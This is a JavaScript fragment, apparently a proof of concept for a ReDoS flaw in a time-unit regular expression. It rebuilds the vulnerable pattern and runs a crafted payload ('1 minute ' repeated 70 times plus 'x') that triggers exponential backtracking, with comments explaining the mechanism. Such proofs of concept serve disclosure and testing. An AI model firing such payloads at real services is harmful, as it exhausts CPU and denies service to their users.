   const VULNERABLE_TIMING_PATTERN = `(?:(?:about|around)\\s*)?${NO_CAPTURE}\\s*(?:,?\\s*${NO_CAPTURE})*`;

   // Anchor the regex to force full-string evaluation. Without anchors, .test() might 
   // find a valid match at the start and return immediately, bypassing the backtracking.
   const redosRegex = new RegExp(`^${VULNERABLE_TIMING_PATTERN}$`, "i");

   // 2. Crafted Malicious Payload
   // Each "1 minute " ends with a space. The pattern expects trailing \s* and preceding \s*.
   // This creates ambiguous whitespace boundaries between iterations. 
   // When the regex engine hits the terminating 'x', it fails to match the end anchor.
   // It then backtracks, trying to distribute the trailing spaces between the adjacent 
   // \s* quantifiers in every possible order. With repeated valid tokens, the search tree 
   // grows exponentially, quickly exceeding the safe backtrack limit of 30,000.
   const maliciousPayload = "1 minute ".repeat(70) + "x";

   console.log("Executing crafted input against reconstructed TIME_UNITS_PATTERN...");

   // 3. Trigger the vulnerability
   // This execution will consume exponential CPU cycles attempting to resolve the 
   // ambiguous \s*\s* boundaries. The runtime flag --regexp-backtracks-before-fallback=30000 
   // ensures this manifests as a visible failure/abort once the threshold is crossed.
   redosRegex.test(maliciousPayload);
